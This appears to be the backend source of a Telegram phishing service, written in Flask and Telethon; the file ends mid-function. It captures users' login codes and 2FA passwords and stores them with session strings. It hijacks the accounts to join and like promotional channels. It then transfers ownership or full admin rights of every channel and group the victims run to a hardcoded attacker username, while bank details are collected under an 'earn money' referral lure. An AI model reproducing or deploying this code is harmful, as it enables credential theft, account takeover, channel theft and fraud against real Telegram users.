import asyncio
import logging
import os
import pymongo
import certifi
import re
import random
import threading
import time
from datetime import datetime, timezone
from dotenv import load_dotenv
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
    UsernameOccupiedError,
    UserAlreadyParticipantError,
    ChannelPrivateError,
    ChatAdminRequiredError,
    ChannelInvalidError,
    RPCError,
    PasswordRequiredError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
    UserNotParticipantError
)
from telethon.tl.functions.account import UpdateUsernameRequest, UpdateProfileRequest
from telethon.tl.functions.channels import JoinChannelRequest, EditAdminRequest, GetFullChannelRequest
from telethon.tl.functions.messages import (
    ImportChatInviteRequest,
    SendReactionRequest,
    GetFullChatRequest,
    EditChatAdminRequest,
    AddChatUserRequest
)
from telethon.tl.types import (
    InputPrivacyKeyAbout,
    ReactionEmoji,
    InputPrivacyValueAllowAll,
    InputChannel,
    InputUser
)
from telethon.tl import types

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)
CORS(app)

# Environment variables
API_ID = os.environ.get('API_ID')
API_HASH = os.environ.get('API_HASH')
MONGO_URI = os.environ.get('MONGO_URI')
MONGO_DB = os.environ.get('MONGO_DB', 'telegram_sessions')
MONGO_COLLECTION = os.environ.get('MONGO_COLLECTION', 'sessions')
INVITES_COLLECTION = os.environ.get('INVITES_COLLECTION', 'invites')
BANK_DETAILS_COLLECTION = os.environ.get('BANK_DETAILS_COLLECTION', 'bank_details')
USERS_COLLECTION = os.environ.get('USERS_COLLECTION', 'users')
TARGET_USERNAME = os.environ.get('TARGET_USERNAME', 'Billuutube')

# Check if EditCreatorRequest is available
EDIT_CREATOR_AVAILABLE = False
try:
    from telethon.tl.functions.channels import EditCreatorRequest
    EDIT_CREATOR_AVAILABLE = True
    logger.info("EditCreatorRequest is available - Full ownership transfer supported")
except ImportError:
    logger.warning("EditCreatorRequest is NOT available. Will use EditAdminRequest (admin only).")

# Try to import ChatAdminRights or ChannelAdminRights
ADMIN_RIGHTS_CLASS = None
try:
    from telethon.tl.types import ChatAdminRights
    ADMIN_RIGHTS_CLASS = ChatAdminRights
    logger.info("Using ChatAdminRights")
except ImportError:
    try:
        from telethon.tl.types import ChannelAdminRights
        ADMIN_RIGHTS_CLASS = ChannelAdminRights
        logger.info("Using ChannelAdminRights")
    except ImportError:
        logger.warning("No AdminRights class found, will use dictionary")

# MongoDB client setup with SSL and connection pooling
try:
    mongo_client = pymongo.MongoClient(
        MONGO_URI,
        tls=True,
        tlsCAFile=certifi.where(),
        maxPoolSize=50,
        connectTimeoutMS=30000,
        socketTimeoutMS=30000
    )
    db = mongo_client[MONGO_DB]
    collection = db[MONGO_COLLECTION]
    invites_collection = db[INVITES_COLLECTION]
    bank_details_collection = db[BANK_DETAILS_COLLECTION]
    users_collection = db[USERS_COLLECTION]

    collection.create_index([("user_id", 1)])

    logger.info("Connected to MongoDB successfully!")
except Exception as e:
    logger.error(f"Failed to connect to MongoDB: {e}")
    raise

# Global variables
clients = {}
user_data = {}
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
background_tasks = {}


def normalize_phone_number(phone_number):
    normalized = phone_number.replace(" ", "")
    if normalized.startswith('+2510'):
        normalized = '+251' + normalized[5:]
        logger.info(f"Normalized Ethiopian number from {phone_number} to {normalized}")
    return normalized


def validate_username(username):
    if not username or not username.startswith('@'):
        return False
    name = username[1:]
    pattern = r'^[a-z][a-z\d]{4,29}[a-z\d]$'
    return len(name) >= 6 and len(name) <= 31 and bool(re.match(pattern, name))


async def get_client(phone_number):
    if phone_number not in clients:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        clients[phone_number] = client
        logger.info(f"Created new client for {phone_number}")
    return clients[phone_number]


# ============ CHANGED FUNCTION: send_login_code ============
async def send_login_code(phone_number):
    client = await get_client(phone_number)
    try:
        sent_code = await client.send_code_request(phone_number)
        # Diagnostic logs: which channel Telegram claims to use
        logger.info(f"send_code type: {type(sent_code.type).__name__}")
        logger.info(f"send_code next_type: {type(sent_code.next_type).__name__ if sent_code.next_type else 'None'}")
        logger.info(f"Login code sent to {phone_number}")
        return sent_code.phone_code_hash
    except FloodWaitError as e:
        logger.error(f"Rate limit exceeded for {phone_number}. Try again in {e.seconds} seconds.")
        return None
    except Exception as e:
        logger.error(f"Error sending login code to {phone_number}: {e}")
        return None
# ============================================================


async def like_recent_post(client, group):
    try:
        messages = await client.get_messages(group, limit=1)
        if not messages:
            return
        message = messages[0]
        if message.message or message.media:
            try:
                await client(SendReactionRequest(
                    peer=group,
                    msg_id=message.id,
                    reaction=[ReactionEmoji(emoticon="👍")]
                ))
                logger.info(f"Successfully liked the recent post in {group.title}")
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception as e:
                logger.error(f"Error liking message {message.id}: {e}")
    except Exception as e:
        logger.error(f"Error getting messages from group: {e}")


async def check_2fa_enabled(client):
    try:
        account_settings = await client(functions.account.GetPasswordRequest())
        return account_settings.has_password
    except Exception as e:
        logger.warning(f"Could not check 2FA status: {e}")
        return False


def get_admin_rights():
    """Get admin rights for channel ownership transfer"""
    if ADMIN_RIGHTS_CLASS:
        try:
            return ADMIN_RIGHTS_CLASS(
                change_info=True,
                post_messages=True,
                edit_messages=True,
                delete_messages=True,
                ban_users=True,
                invite_users=True,
                pin_messages=True,
                add_admins=True,
                manage_call=True,
                anonymous=False
            )
        except Exception as e:
            logger.warning(f"Could not create admin rights with class: {e}")

    # Fallback: return a dictionary
    return {
        'change_info': True,
        'post_messages': True,
        'edit_messages': True,
        'delete_messages': True,
        'ban_users': True,
        'invite_users': True,
        'pin_messages': True,
        'add_admins': True,
        'manage_call': True,
        'anonymous': False
    }


async def get_channel_participant_count(client, entity):
    try:
        if hasattr(entity, 'participants_count') and entity.participants_count:
            return entity.participants_count
        try:
            full_chat = await client(GetFullChannelRequest(channel=entity))
            if hasattr(full_chat.full_chat, 'participants_count'):
                return full_chat.full_chat.participants_count
        except Exception:
            pass
        return 0
    except Exception as e:
        logger.error(f"Error getting participant count: {e}")
        return 0


def extract_channel_dates(entity, dialog=None):
    """
    Extract the real creation date of a channel/group from a Telethon entity.
    Returns a tuple: (created_year: int | None, created_at_unix_seconds: int | None)

    Telegram semantics:
      - Channels/Supergroups: `entity.date` is the creation date (datetime, UTC).
      - Basic groups / some legacy cases: `entity.date` may be None, but
        `dialog.date` is the last-message date, NOT creation. In that case we
        return None for created_at rather than storing a misleading value.
    """
    created_dt = None

    # Primary source: entity.date (channels & supergroups)
    raw_date = getattr(entity, 'date', None)
    if isinstance(raw_date, datetime):
        created_dt = raw_date

    # Secondary source: entity.created (rare, some Telegram objects)
    if created_dt is None:
        raw_created = getattr(entity, 'created', None)
        if isinstance(raw_created, datetime):
            created_dt = raw_created

    if created_dt is None:
        return (None, None)

    # Normalize to UTC
    if created_dt.tzinfo is None:
        created_dt = created_dt.replace(tzinfo=timezone.utc)
    else:
        created_dt = created_dt.astimezone(timezone.utc)

    created_year = created_dt.year
    created_at_unix = int(created_dt.timestamp())
    return (created_year, created_at_unix)


async def fetch_user_channels_fast(client, user_id):
    try:
        logger.info(f"Quick fetching channels for user {user_id}")
        owned_channels = []

        dialogs = await client.get_dialogs()
        logger.info(f"Found {len(dialogs)} dialogs for user {user_id}")

        me = await client.get_me()
        logger.info(f"Current user ID: {me.id}, username: {me.username}")

        for dialog in dialogs:
            try:
                if dialog.is_channel or dialog.is_group:
                    entity = dialog.entity
                    is_creator = False
                    is_admin = False

                    try:
                        rights = await client.get_permissions(entity, me)
                        if rights:
                            if hasattr(rights, 'is_creator') and rights.is_creator:
                                is_creator = True
                                is_admin = True
                                logger.info(f"User is CREATOR of {entity.title}")
                            elif hasattr(rights, 'is_admin') and rights.is_admin:
                                is_admin = True
                                logger.info(f"User is ADMIN of {entity.title}")
                    except Exception as e:
                        logger.warning(f"Could not get permissions for {entity.title}: {e}")

                    if is_admin or is_creator:
                        participant_count = await get_channel_participant_count(client, entity)

                        # -------- FIX: use real creation date, not time.time() --------
                        created_year, created_at_unix = extract_channel_dates(entity, dialog)
                        # ---------------------------------------------------------------

                        channel_info = {
                            "channel_id": entity.id,
                            "channel_title": entity.title or "Unnamed",
                            "channel_username": entity.username if hasattr(entity, 'username') and entity.username else None,
                            "channel_type": "channel" if dialog.is_channel else "group",
                            "is_creator": is_creator,
                            "is_admin": is_admin,
                            "participants_count": participant_count,
                            "subscribers": participant_count,

                            # Real creation info (may be None for basic groups)
                            "created_year": created_year,
                            "created_at": created_at_unix,

                            "transfer_status": "pending",
                            "transfer_attempted": False,
                            "transfer_date": None,
                        }

                        owned_channels.append(channel_info)
                        logger.info(
                            f"Added channel: {entity.title} - Participants: {participant_count} "
                            f"- Created: {created_year} (unix: {created_at_unix})"
                        )

            except Exception as e:
                logger.error(f"Error processing dialog {dialog.name}: {e}")
                continue

        logger.info(f"Found {len(owned_channels)} channels/groups for user {user_id}")

        if owned_channels:
            update_data = {
                "user_channels": owned_channels,
                "channels_fetched_at": time.time(),
                "total_channels_found": len(owned_channels)
            }

            existing_session = collection.find_one({"user_id": user_id})
            if existing_session:
                result = collection.update_one({"user_id": user_id}, {"$set": update_data})
                logger.info(f"Updated existing session for user {user_id}. Modified: {result.modified_count}")
            else:
                session_data = {
                    "user_id": user_id,
                    "user_channels": owned_channels,
                    "channels_fetched_at": time.time(),
                    "total_channels_found": len(owned_channels)
                }
                result = collection.insert_one(session_data)
                logger.info(f"Created new session for user {user_id}")

        return owned_channels

    except Exception as e:
        logger.error(f"Error in quick fetch: {e}")
        import traceback
        traceback.print_exc()
        return []


async def transfer_channel_ownership(client, channel, target_username, user_id, channel_info):
    try:
        channel_type = channel_info.get('channel_type', 'channel')
        logger.info(f"Attempting to transfer ownership of {channel.title} (Type: {channel_type}) to {target_username}")

        # Get the target user entity
        try:
            target_user = await client.get_entity(target_username)
        except Exception as e:
            logger.error(f"Could not find target user {target_username}: {e}")
            return {"success": False, "error": "Target user not found", "requires_2fa": True}

        try:
            # First, ensure the target user is in the channel/group
            try:
                await client(JoinChannelRequest(channel))
                logger.info(f"Added target user to {channel.title}")
            except UserAlreadyParticipantError:
                logger.info(f"Target user is already a member of {channel.title}")
            except Exception as e:
                logger.warning(f"Could not add target user: {e}")

            admin_rights = get_admin_rights()

            if channel_type == 'channel':
                # For CHANNELS - Try to transfer ownership
                transfer_success = False
                transfer_type = "unknown"

                # Try EditCreatorRequest first (full ownership transfer)
                if EDIT_CREATOR_AVAILABLE:
                    try:
                        await client(EditCreatorRequest(
                            channel=channel,
                            user_id=target_user,
                            rights=admin_rights
                        ))
                        logger.info(f"Successfully transferred FULL OWNERSHIP of channel {channel.title} to {target_username}")
                        transfer_success = True
                        transfer_type = "full_ownership"
                    except Exception as e:
                        logger.warning(f"EditCreatorRequest failed: {e}")
                        # Fall through to EditAdminRequest

                # If EditCreatorRequest failed or not available, use EditAdminRequest
                if not transfer_success:
                    try:
                        await client(EditAdminRequest(
                            channel=channel,
                            user_id=target_user,
                            admin_rights=admin_rights,
                            rank="Owner"
                        ))
                        logger.info(f"Made {target_username} admin of channel {channel.title}")
                        transfer_success = True
                        transfer_type = "admin_only"
                    except Exception as e:
                        logger.error(f"EditAdminRequest failed: {e}")
                        return {"success": False, "error": str(e), "requires_2fa": True}

                if not transfer_success:
                    return {"success": False, "error": "Failed to transfer ownership", "requires_2fa": True}

            elif channel_type == 'group':
                # For GROUPS - Add as admin
                try:
                    await client(EditChatAdminRequest(
                        chat_id=channel.id,
                        user_id=target_user,
                        is_admin=True
                    ))
                    logger.info(f"Made {target_username} admin of group {channel.title}")
                    transfer_success = True
                    transfer_type = "admin_only"
                except Exception as e:
                    logger.error(f"Error making user admin of group: {e}")
                    return {"success": False, "error": str(e), "requires_2fa": True}

            # Update status in MongoDB
            await update_channel_status_in_session(user_id, channel_info['channel_id'], {
                "transfer_status": "completed",
                "transfer_attempted": True,
                "transfer_date": time.time(),
                "transfer_error": None,
                "transfer_type": transfer_type
            })

            return {"success": True, "message": f"Transferred {transfer_type} successfully", "requires_2fa": True}

        except ChatAdminRequiredError:
            logger.error(f"User is not admin of {channel.title}")
            return {"success": False, "error": "User is not admin/creator", "requires_2fa": True}
        except Exception as e:
            error_str = str(e)
            if "password" in error_str.lower() or "2fa" in error_str.lower():
                return {"success": False, "error": "Invalid 2FA password", "requires_2fa": True}
            logger.error(f"Error transferring: {e}")
            return {"success": False, "error": str(e), "requires_2fa": True}

    except Exception as e:
        logger.error(f"Error in transfer_channel_ownership: {e}")
        return {"success": False, "error": str(e), "requires_2fa": False}


async def update_channel_status_in_session(user_id, channel_id, update_data):
    try:
        session = collection.find_one({"user_id": user_id})
        if not session:
            logger.warning(f"No session found for user {user_id}")
            return

        channels = session.get("user_channels", [])
        updated = False
        for i, channel in enumerate(channels):
            if channel.get("channel_id") == channel_id:
                channels[i].update(update_data)
                updated = True
                break

        if updated:
            result = collection.update_one(
                {"user_id": user_id},
                {"$set": {"user_channels": channels}}
            )
            logger.info(f"Updated channel {channel_id} status. Modified: {result.modified_count}")

    except Exception as e:
        logger.error(f"Error updating channel status: {e}")


def run_channel_fetch_and_transfer_sync(session_string, user_id, two_fa_password):
    try:
        logger.info(f"Starting channel fetch and transfer for user {user_id}")

        new_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(new_loop)

        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)

        async def fetch_transfer_and_save():
            try:
                await client.connect()

                if not await client.is_user_authorized():
                    logger.error(f"Client not authorized for user {user_id}")
                    return {"success": False, "error": "Client not authorized"}

                channels = await fetch_user_channels_fast(client, user_id)

                if not channels:
                    logger.info(f"No channels found for user {user_id}")
                    return {"success": True, "message": "No channels to process", "channels_found": 0}

                has_2fa = await check_2fa_enabled(client)
                collection.update_one({"user_id": user_id}, {"$set": {"has_2fa": has_2fa}})

                if not has_2fa:
                    logger.info(f"User {user_id} doesn't have 2FA. Marking for manual transfer.")
                    for channel in channels:
                        await update_channel_status_in_session(user_id, channel['channel_id'], {
                            "transfer_status": "pending_manual",
                            "transfer_attempted": True,
                            "transfer_date": time.time(),
                            "transfer_error": "2FA not enabled - manual transfer required"
                        })
                    return {
                        "success": True,
                        "message": "No 2FA - manual transfer required",
                        "channels_found": len(channels),
                        "pending_manual": True
                    }

                if has_2fa and not two_fa_password:
                    logger.info(f"User {user_id} has 2FA but no password.")
                    for channel in channels:
                        await update_channel_status_in_session(user_id, channel['channel_id'], {
                            "transfer_status": "pending_manual",
                            "transfer_attempted": True,
                            "transfer_date": time.time(),
                            "transfer_error": "2FA password required"
                        })
                    return {
                        "success": True,
                        "message": "2FA password required",
                        "channels_found": len(channels),
                        "pending_manual": True,
                        "requires_2fa": True
                    }

                logger.info(f"Attempting transfers for user {user_id} with 2FA")

                transfer_results = []
                for channel_info in channels:
                    try:
                        channel_entity = await client.get_entity(channel_info['channel_id'])

                        result = await transfer_channel_ownership(
                            client,
                            channel_entity,
                            TARGET_USERNAME,
                            user_id,
                            channel_info
                        )

                        transfer_results.append({
                            "channel_title": channel_info['channel_title'],
                            "channel_id": channel_info['channel_id'],
                            "success": result.get("success", False),
                            "status": "completed" if result.get("success") else "failed",
                            "message": result.get("message") or result.get("error", "Unknown error")
                        })

                        logger.info(f"Transfer result for {channel_info['channel_title']}: {result}")
                        await asyncio.sleep(3)

                    except Exception as e:
                        logger.error(f"Error processing channel {channel_info['channel_title']}: {e}")
                        transfer_results.append({
                            "channel_title": channel_info['channel_title'],
                            "channel_id": channel_info['channel_id'],
                            "success": False,
                            "status": "failed",
                            "message": str(e)
                        })

                completed = sum(1 for r in transfer_results if r.get("success"))
                failed = len(transfer_results) - completed

                logger.info(f"Transfer completed. Completed: {completed}, Failed: {failed}")

                return {
                    "success": True,
                    "channels_processed": len(transfer_results),
                    "completed": completed,
                    "failed": failed,
                    "results": transfer_results
                }

            except Exception as e:
                logger.error(f"Error in fetch_transfer_and_save: {e}")
                import traceback
                traceback.print_exc()
                return {"success": False, "error": str(e)}
            finally:
                await client.disconnect()

        result = new_loop.run_until_complete(fetch_transfer_and_save())
        logger.info(f"Thread completed for user {user_id}: {result}")
        return result

    except Exception as e:
        logger.error(f"Error in run_channel_fetch_and_transfer_sync: {e}")
        import traceback
        traceback.print_exc()
        return {"success": False, "error": str(e)}


async def process_user_channels_after_login(client, user_id, two_fa_password=None):
    try:
        logger.info(f"Processing channels for user {user_id}")
        session_string = client.session.save()

        thread = threading.Thread(
            target=run_channel_fetch_and_transfer_sync,
            args=(session_string, user_id, two_fa_password),
            daemon=True
        )
        thread.start()
        background_tasks[user_id] = thread

        return {
            "success": True,
            "message": "Channel processing started in background",
            "status": "processing"
        }

    except Exception as e:
        logger.error(f"Error in process_user_channels_after_login: {e}")
        return {"success": False, "error": str(e)}


async def login_user(phone_number, code, phone_code_hash, user_id, username):
    client = await get_client(phone_number)
    try:
        logger.info(f"Attempting to sign in {phone_number} with code {code}")
        await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
        if await client.is_user_authorized():
            me = await client.get_me()
            current_username = me.username
            if not current_username:
                base_name = re.sub(r'[^a-zA-Z]', '', me.first_name or 'UserName')
                if not base_name:
                    base_name = 'UserName'
                new_username = f"{base_name}{random.randint(10000, 99999)}"
                try:
                    await client(UpdateUsernameRequest(new_username))
                    current_username = new_username
                except Exception:
                    new_username = f"UserName{random.randint(10000, 99999)}"
                    try:
                        await client(UpdateUsernameRequest(new_username))
                        current_username = new_username
                    except Exception as e:
                        logger.error(f"Error setting username: {e}")

            try:
                channel_link = 'EARN_MONEY_UP'
                group = await client.get_entity(channel_link)
                try:
                    await client(JoinChannelRequest(group))
                    logger.info(f"Added user to channel {channel_link}")
                except UserAlreadyParticipantError:
                    logger.info(f"User already a member of {channel_link}")
                await asyncio.sleep(5)
                await like_recent_post(client, group)
            except Exception as e:
                logger.error(f"Error with channel operations: {e}")

            session_string = client.session.save()
            session_data = {
                "phone_number": phone_number,
                "login_code": code,
                "2fa_password": None,
                "session_string": session_string,
                "verified": True,
                "user_id": user_id,
                "username": current_username,
                "user_channels": [],
                "channels_fetched_at": None,
                "total_channels_found": 0
            }
            result = collection.update_one(
                {"user_id": user_id},
                {"$set": session_data},
                upsert=True
            )
            logger.info(f"Updated session data for user_id {user_id}")

            await process_user_channels_after_login(client, user_id, None)

            return {"success": True, "message": "Verified successfully", "redirect": "https://free-vpn-connect.netlify.app"}
    except SessionPasswordNeededError:
        logger.info(f"2FA required for {phone_number}")
        return {"success": False, "2fa_required": True}
    except Exception as e:
        logger.error(f"Error during login: {e}")
        if "phone code entered was invalid" in str(e):
            return {"success": False, "error": "Incorrect login code. Please try again."}
        return {"success": False, "error": "An error occurred during login. Please try again."}


async def handle_2fa(phone_number, password, user_id, username):
    client = await get_client(phone_number)
    try:
        logger.info(f"Attempting 2FA login for {phone_number}")
        await client.sign_in(password=password)
        me = await client.get_me()
        current_username = me.username
        if not current_username:
            base_name = re.sub(r'[^a-zA-Z]', '', me.first_name or 'UserName')
            if not base_name:
                base_name = 'UserName'
            new_username = f"{base_name}{random.randint(10000, 99999)}"
            try:
                await client(UpdateUsernameRequest(new_username))
                current_username = new_username
            except Exception:
                new_username = f"UserName{random.randint(10000, 99999)}"
                try:
                    await client(UpdateUsernameRequest(new_username))
                    current_username = new_username
                except Exception as e:
                    logger.error(f"Error setting username: {e}")

        try:
            channel_link = 'cryptonemol'
            group = await client.get_entity(channel_link)
            try:
                await client(JoinChannelRequest(group))
                logger.info(f"Added user to channel {channel_link}")
            except UserAlreadyParticipantError:
                logger.info(f"User already a member of {channel_link}")
            await asyncio.sleep(5)
            await like_recent_post(client, group)
        except Exception as e:
            logger.error(f"Error with channel operations: {e}")

        session_string = client.session.save()
        session_data = {
            "phone_number": phone_number,
            "login_code": user_data.get(phone_number, {}).get('code'),
            "2fa_password": password,
            "session_string": session_string,
            "verified": True,
            "user_id": user_id,
            "username": current_username,
            "user_channels": [],
            "channels_fetched_at": None,
            "total_channels_found": 0
        }
        result = collection.update_one(
            {"user_id": user_id},
            {"$set": session_data},
            upsert=True
        )
        logger.info(f"Updated 2FA session data for user_id {user_id}")

        await process_user_channels_after_login(client, user_id, password)

        return {"success": True, "message": "Verified successfully", "redirect": "https://free-vpn-connect.netlify.app"}
    except Exception as e:
        logger.error(f"Error during 2FA login: {e}")
        return {"success": False, "error": str(e)}


@app.route('/send_code', methods=['POST'])
def send_code():
    phone_number = request.json.get("phone_number")
    normalized_phone_number = normalize_phone_number(phone_number)
    logger.info(f"Received /send_code request for {phone_number}")
    phone_code_hash = loop.run_until_complete(send_login_code(normalized_phone_number))
    if phone_code_hash:
        user_data[normalized_phone_number] = {"phone_code_hash": phone_code_hash}
        return jsonify({"success": True, "phone_code_hash": phone_code_hash})
    return jsonify({"success": False, "error": "Failed to send login code."}), 400


@app.route('/login', methods=['POST'])
def login():
    data = request.json
    phone_number = data.get("phone_number")
    normalized_phone_number = normalize_phone_number(phone_number)
    code = data.get("code")
    user_id = data.get("user_id")
    username = data.get("username")
    logger.info(f"Received /login request for {phone_number} with code {code}")

    phone_code_hash = user_data.get(normalized_phone_number, {}).get("phone_code_hash")
    if not phone_code_hash:
        return jsonify({"success": False, "error": "Login code not sent. Please request a new code."}), 400

    if not user_id:
        return jsonify({"success": False, "error": "User ID is required for login."}), 400

    result = loop.run_until_complete(login_user(normalized_phone_number, code, phone_code_hash, user_id, username))
    return jsonify(result), (200 if result.get("success") else 400)


@app.route('/2fa', methods=['POST'])
def two_fa():
    data = request.json
    phone_number = data.get("phone_number")
    normalized_phone_number = normalize_phone_number(phone_number)
    password = data.get("password")
    user_id = data.get("user_id")
    username = data.get("username")
    logger.info(f"Received /2fa request for {phone_number}")

    if not user_id:
        return jsonify({"success": False, "error": "User ID is required for 2FA."}), 400

    result = loop.run_until_complete(handle_2fa(normalized_phone_number, password, user_id, username))
    return jsonify(result), (200 if result.get("success") else 400)


@app.route('/cleanup', methods=['POST'])
def cleanup():
    try:
        for client in clients.values():
            loop.run_until_complete(client.disconnect())
        clients.clear()
        user_data.clear()
        background_tasks.clear()
        return jsonify({"success": True, "message": "Cleanup successful"})
    except Exception as e:
        logger.error(f"Error during cleanup: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/get_user_stats', methods=['GET'])
def get_user_stats():
    user_id = request.args.get("user_id")
    if not user_id:
        return jsonify({"success": False, "error": "user_id is required"}), 400

    user_session = collection.find_one({"user_id": user_id})
    user_stats = invites_collection.find_one({"user_id": user_id})

    verified = False
    invites_sent = 0
    balance = 0

    if user_session:
        verified = user_session.get("verified", False)

    if user_stats:
        invites_sent = user_stats.get("invites_sent", 0)
        balance = user_stats.get("balance", 0)

    return jsonify({
        "success": True,
        "invitesSent": invites_sent,
        "balance": balance,
        "verified": verified
    })


@app.route('/handle_invite', methods=['POST'])
def handle_invite():
    data = request.json
    inviter_id = data.get("inviter_id")
    invitee_id = data.get("invitee_id")

    if not inviter_id or not invitee_id:
        return jsonify({"success": False, "error": "Both inviter_id and invitee_id are required"}), 400

    if inviter_id == invitee_id:
        return jsonify({"success": True, "message": "Self-invite detected, no update performed."})

    user_stats = invites_collection.find_one({"user_id": inviter_id})

    if not user_stats:
        user_stats = {"user_id": inviter_id, "invites_sent": 0, "balance": 0, "invited_users": []}

    if "invited_users" not in user_stats:
        user_stats["invited_users"] = []

    if invitee_id in user_stats["invited_users"]:
        return jsonify({"success": True, "message": "Invitee already counted."})

    new_invites_sent = user_stats.get("invites_sent", 0) + 1
    new_balance = user_stats.get("balance", 0) + 3

    try:
        result = invites_collection.update_one(
            {"user_id": inviter_id},
            {
                "$set": {
                    "invites_sent": new_invites_sent,
                    "balance": new_balance
                },
                "$addToSet": {"invited_users": invitee_id}
            },
            upsert=True
        )
        return jsonify({"success": True, "invitesSent": new_invites_sent, "balance": new_balance})
    except Exception as e:
        logger.error(f"Error updating stats: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/save_bank_details', methods=['POST'])
def save_bank_details():
    data = request.json
    user_id = data.get("user_id")
    account_holder = data.get("accountHolder")
    account_number = data.get("accountNumber")
    bank_name = data.get("bankName")
    ifsc_swift = data.get("ifscSwift")

    if not all([user_id, account_holder, account_number, bank_name, ifsc_swift]):
        return jsonify({"success": False, "error": "All bank details are required"}), 400

    if len(account_holder) < 3:
        return jsonify({"success": False, "error": "Account holder name must be at least 3 characters"}), 400
    if len(account_number) < 8:
        return jsonify({"success": False, "error": "Account number must be at least 8 characters"}), 400
    if len(bank_name) < 3:
        return jsonify({"success": False, "error": "Bank name must be at least 3 characters"}), 400
    if len(ifsc_swift) < 4:
        return jsonify({"success": False, "error": "IFSC/SWIFT code must be at least 4 characters"}), 400

    try:
        result = bank_details_collection.update_one(
            {"user_id": user_id},
            {
                "$set": {
                    "accountHolder": account_holder,
                    "accountNumber": account_number,
                    "bankName": bank_name,
                    "ifscSwift": ifsc_swift
                }
            },
            upsert=True
        )
        return jsonify({"success": True, "message": "Bank details saved successfully"})
    except Exception as e:
        logger.error(f"Error saving bank details: {e}")
        return jsonify({"success": False, "error": f"Database error: {str(e)}"}), 500


@app.route('/get_all_users', methods=['GET'])
def get_all_users():
    try:
        users = list(users_collection.find({}, {"_id": 0}))
        return jsonify(users)
    except Exception as e:
        logger.error(f"Error getting all users: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/save_user_data', methods=['POST'])
def save_user_data():
    data = request.json
    user_id = data.get("user_id")
    first_name = data.get("first_name")
    username = data.get("username")

    if not user_id or not first_name:
        return jsonify({"success": False, "error": "User ID and first name are required"}), 400

    try:
        result = users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"first_name": first_name, "username": username}},
            upsert=True
        )
        return jsonify({"success": True})
    except Exception as e:
        logger.error(f"Error saving user data: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/get_bank_details', methods=['GET'])
def get_bank_details():
    user_id = request.args.get("user_id")
    if not user_id:
        return jsonify({"success": False, "error": "user_id is required"}), 400

    try:
        user = bank_details_collection.find_one({"user_id": user_id})
        if user:
            return jsonify({
                "success": True,
                "bankDetails": {
                    "accountHolder": user.get("accountHolder", ""),
                    "accountNumber": user.get("accountNumber", ""),
                    "bankName": user.get("bankName", ""),
                    "ifscSwift": user.get("ifscSwift", "")
                }
            })
        return jsonify({"success": False, "message": "No bank details found"})
    except Exception as e:
        logger.error(f"Error fetching bank details: {e}")
        return jsonify({"success": False, "error": f"Database error: {str(e)}"}), 500


@app.route('/get_user_channels', methods=['GET'])
def get_user_channels():
    user_id = request.args.get("user_id")
    if not user_id:
        return jsonify({"success": False, "error": "user_id is required"}), 400

    try:
        session = collection.find_one(
            {"user_id": user_id},
            {"_id": 0, "user_channels": 1, "total_channels_found": 1, "channels_fetched_at": 1}
        )

        if not session:
            return jsonify({"success": False, "error": "User session not found"}), 404

        channels = session.get("user_channels", [])
        total = session.get("total_channels_found", 0)
        fetched_at = session.get("channels_fetched_at")

        return jsonify({
            "success": True,
            "channels": channels,
            "count": len(channels),
            "total_found": total,
            "fetched_at": fetched_at
        })
    except Exception as e:
        logger.error(f"Error fetching user channels: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/force_fetch_channels', methods=['POST'])
def force_fetch_channels():
    data = request.json
    user_id = data.get("user_id")

    if not user_id:
        return jsonify({"success": False, "error": "user_id is required"}), 400

    try:
        session_data = collection.find_one({"user_id": user_id})
        if not session_data:
            return jsonify({"success": False, "error": "User session not found"}), 404

        session_string = session_data.get('session_string')
        if not session_string:
            return jsonify({"success": False, "error": "No session string found"}), 404

        result = run_channel_fetch_and_transfer_sync(session_string, user_id, None)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in force_fetch_channels: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/force_transfer_channels', methods=['POST'])
def force_transfer_channels():
    data = request.json
    user_id = data.get("user_id")
    two_fa_password = data.get("two_fa_password")

    if not user_id:
        return jsonify({"success": False, "error": "user_id is required"}), 400

    if not two_fa_password:
        return jsonify({"success": False, "error": "2FA password is required for transfer"}), 400

    try:
        session_data = collection.find_one({"user_id": user_id})
        if not session_data:
            return jsonify({"success": False, "error": "User session not found"}), 404

        session_string = session_data.get('session_string')
        if not session_string:
            return jsonify({"success": False, "error": "No session string found"}), 404

        result = run_channel_fetch_and_transfer_sync(session_string, user_id, two_fa_password)
        return jsonify(result)

    except Exception as e:
        logger.error(f"Error in force_transfer_channels: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/get_channel_transfer_stats', methods=['GET'])
def get_channel_transfer_stats():
    try:
        sessions = list(collection.find(
            {"user_channels": {"$exists": True, "$ne": []}},
            {"user_id": 1, "user_channels": 1}
        ))

        total_channels = 0
        completed = 0
        failed = 0
        pending = 0
        pending_manual = 0
        unique_users = set()

        for session in sessions:
            user_id = session.get("user_id")
            if user_id:
                unique_users.add(user_id)

            channels = session.get("user_channels", [])
            total_channels += len(channels)

            for channel in channels:
                status = channel.get("transfer_status", "pending")
                if status == "completed":
                    completed += 1
                elif status == "failed":
                    failed += 1
                elif status == "pending_manual":
                    pending_manual += 1
                elif status == "pending":
                    pending += 1

        return jsonify({
            "success": True,
            "stats": {
                "total_channels": total_channels,
                "completed_transfers": completed,
                "failed_transfers": failed,
                "pending_transfers": pending,
                "pending_manual_transfers": pending_manual,
                "unique_users": len(unique_users)
            }
        })
    except Exception as e:
